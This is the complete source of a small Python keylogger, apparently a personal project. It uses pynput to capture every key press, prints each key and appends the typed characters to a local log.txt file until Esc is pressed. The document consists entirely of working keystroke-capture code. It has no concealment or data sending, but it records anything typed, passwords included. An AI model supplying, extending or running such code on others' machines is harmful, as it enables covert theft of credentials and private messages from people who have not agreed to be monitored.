from pynput.keyboard import Key, Listener

filename = "log.txt"
path = "D:\\Projects\\Python-keylogger"
extension = "\\"

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    # reset
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(path + extension + filename, "a") as f:
        for key in keys:
            # get rid of annoying single quotes
            k = str(key).replace("'", "")
            print(k)
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
